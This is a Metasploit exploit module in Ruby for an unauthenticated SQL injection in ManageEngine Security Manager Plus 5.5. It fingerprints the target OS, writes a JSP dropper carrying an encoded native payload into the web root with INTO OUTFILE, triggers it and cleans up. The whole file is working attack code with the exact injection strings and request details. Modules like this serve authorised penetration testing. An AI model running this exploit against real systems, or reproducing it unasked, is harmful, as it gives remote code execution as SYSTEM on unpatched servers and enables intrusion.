##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize(info={})
		super(update_info(info,
			'Name'           => "ManageEngine Security Manager Plus 5.5 build 5505 SQL Injection",
			'Description'    => %q{
					This module exploits a SQL injection found in ManageEngine Security Manager Plus
				advanced search page, which results in remote code execution under the context of
				SYSTEM in Windows; or as the user in Linux.  Authentication is not required in order
				to exploit this vulnerability.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'xistence <xistence[at]0x90.nl>',  # Discovery & Metasploit module
					'sinn3r',                          # Improved Metasploit module
					'egypt'                            # Improved Metasploit module
				],
			'References'     =>
				[
					['EDB','22094'],
					['BID', '56138']
				],
			'Platform'       => ['win', 'linux'],
			'Targets'        =>
				[
					['Automatic', {}],
					['Windows',   { 'Arch' => ARCH_X86, 'Platform' => 'win'   }],
					['Linux',     { 'Arch' => ARCH_X86, 'Platform' => 'linux' }]
				],
			'DefaultTarget'  => 0,
			'Privileged'     => false,
			'DisclosureDate' => "Oct 18 2012"))

		register_options(
			[
				OptPort.new('RPORT', [true, 'The target port', 6262])
			], self.class)
	end


	def check
		res = sqli_exec(Rex::Text.rand_text_alpha(1))

		if res and res.body =~ /Error during search/
			return Exploit::CheckCode::Appears
		else
			return Exploit::CheckCode::Safe
		end
	end


	def pick_target
		return target if target.name != 'Automatic'

		rnd_num   = Rex::Text.rand_text_numeric(1)
		rnd_fname = Rex::Text.rand_text_alpha(5) + ".txt"
		outpath   = "../../webapps/SecurityManager/#{rnd_fname}"

		@clean_ups << outpath

		sqli  = "#{rnd_num})) union select @@version,"
		sqli << (2..28).map {|e| e} * ","
		sqli << " into outfile \"#{outpath}\" FROM mysql.user WHERE #{rnd_num}=((#{rnd_num}"
		sqli_exec(sqli)

		res = send_request_raw({'uri'=>"/#{rnd_fname}"})

		# What @@version returns:
		# Linux   = 5.0.36-enterprise
		# Windows = 5.0.36-enterprise-nt

		if res and res.body =~ /\d\.\d\.\d\d\-enterprise\-nt/
			print_status("#{rhost}:#{rport} - Target selected: #{targets[1].name}")
			return targets[1]  # Windows target
		elsif res and res.body =~ /\d\.\d\.\d\d\-enterprise/
			print_status("#{rhost}:#{rport} - Target selected: #{targets[2].name}")
			return targets[2]
		end

		return nil
	end


	#
	# We're in SecurityManager/bin at this point
	#
	def on_new_session(cli)
		if target['Platform'] == 'linux'
			print_warning("Malicious executable is removed during payload execution")
		end

		if cli.type == 'meterpreter'
			cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
		end

		@clean_ups.each { |f|
			base = File.basename(f)
			f = "../webapps/SecurityManager/#{base}"
			print_warning("#{rhost}:#{rport} - Deleting: \"#{base}\"")

			begin
				if cli.type == 'meterpreter'
					cli.fs.file.rm(f)
				else
					del_cmd = (@my_target['Platform'] == 'linux') ? 'rm' : 'del'
					f = f.gsub(/\//, '\\') if @my_target['Platform'] == 'win'
					cli.shell_command_token("#{del_cmd} \"#{f}\"")
				end

				print_good("#{rhost}:#{rport} - \"#{base}\" deleted")
			rescue ::Exception => e
				print_error("Unable to delete: #{e.message}")
			end
		}
	end


	#
	# Embeds our executable in JSP
	#
	def generate_jsp_payload
		opts                = {:arch => @my_target.arch, :platform => @my_target.platform}
		native_payload      = Rex::Text.encode_base64(generate_payload_exe(opts))
		native_payload_name = Rex::Text.rand_text_alpha(rand(6)+3)
		ext                 = (@my_target['Platform'] == 'win') ? '.exe' : '.bin'

		var_raw     = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_ostream = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_buf     = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_decoder = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_tmp     = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_path    = Rex::Text.rand_text_alpha(rand(8) + 3)
		var_proc2   = Rex::Text.rand_text_alpha(rand(8) + 3)

		if @my_target['Platform'] == 'linux'
			var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)
			chmod = %Q|
			Process #{var_proc1} = Runtime.getRuntime().exec("chmod 777 " + #{var_path});
			Thread.sleep(200);
			|

			var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)
			cleanup = %Q|
			Thread.sleep(200);
			Process #{var_proc3} = Runtime.getRuntime().exec("rm " + #{var_path});
			|
		else
			chmod   = ''
			cleanup = ''
		end

		jsp = %Q|
		<%@page import="java.io.*"%>
		<%@page import="sun.misc.BASE64Decoder"%>

		<%
		byte[] #{var_raw} = null;
		BufferedOutputStream #{var_ostream} = null;
		try {
			String #{var_buf} = "#{native_payload}";

			BASE64Decoder #{var_decoder} = new BASE64Decoder();
			#{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());

			File #{var_tmp} = File.createTempFile("#{native_payload_name}", "#{ext}");
			String #{var_path} = #{var_tmp}.getAbsolutePath();

			#{var_ostream} = new BufferedOutputStream(new FileOutputStream(#{var_path}));
			#{var_ostream}.write(#{var_raw});
			#{var_ostream}.close();
			#{chmod}
			Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});
			#{cleanup}
		} catch (Exception e) {
		}
		%>
		|

		jsp = jsp.gsub(/\n/, '')
		jsp = jsp.gsub(/\t/, '')

		jsp.unpack("H*")[0]
	end

	def sqli_exec(sqli_string)
		cookie  = 'STATE_COOKIE=&'
		cookie << 'SecurityManager/ID/174/HomePageSubDAC_LIST/223/SecurityManager_CONTENTAREA_LIST/226/MainDAC_LIST/166&'
		cookie << 'MainTabs/ID/167/_PV/174/selectedView/Home&'
		cookie << 'Home/ID/166/PDCA/MainDAC/_PV/174&'
		cookie << 'HomePageSub/ID/226/PDCA/SecurityManager_CONTENTAREA/_PV/166&'
		cookie << 'HomePageSubTab/ID/225/_PV/226/selectedView/HomePageSecurity&'
		cookie << 'HomePageSecurity/ID/223/PDCA/HomePageSubDAC/_PV/226&'
		cookie << '_REQS/_RVID/SecurityManager/_TIME/31337; '
		cookie << '2RequestsshowThreadedReq=showThreadedReqshow; '
		cookie << '2RequestshideThreadedReq=hideThreadedReqhide;'

		state_id = Rex::Text.rand_text_numeric(5)

		send_request_cgi({
			'method'    => 'POST',
			'uri'       => "/STATE_ID/#{state_id}/jsp/xmlhttp/persistence.jsp",
			'headers'   => {
				'Cookie' => cookie,
				'Accept-Encoding' => 'identity'
			},
			'vars_get'  => {
				'reqType'    =>'AdvanceSearch',
				'SUBREQUEST' =>'XMLHTTP'
			},
			'vars_post' => {
				'ANDOR'       => 'and',
				'condition_1' => 'OpenPorts@PORT',
				'operator_1'  => 'IN',
				'value_1'     => sqli_string,
				'COUNT'       => '1'
			}
		})
	end

	#
	# Run the actual exploit
	#
	def inject_exec(out)
		hex_jsp = generate_jsp_payload
		rnd_num = Rex::Text.rand_text_numeric(1)
		sqli  = "#{rnd_num})) union select 0x#{hex_jsp},"
		sqli << (2..28).map {|e| e} * ","
		sqli << " into outfile \"#{out}\" FROM mysql.user WHERE #{rnd_num}=((#{rnd_num}"

		print_status("#{rhost}:#{rport} - Trying SQL injection...")
		sqli_exec(sqli)

		fname = "/#{File.basename(out)}"
		print_status("#{rhost}:#{rport} - Requesting #{fname}")
		send_request_raw({'uri' => fname})

		handler
	end


	def exploit
		# This is used to collect files we want to delete later
		@clean_ups = []

		@my_target = pick_target
		if @my_target.nil?
			print_error("#{rhost}:#{rport} - Unable to select a target, we must bail.")
			return
		end

		jsp_name  = rand_text_alpha(rand(6)+3)
		outpath   = "../../webapps/SecurityManager/#{jsp_name + '.jsp'}"

		@clean_ups << outpath

		inject_exec(outpath)
	end
end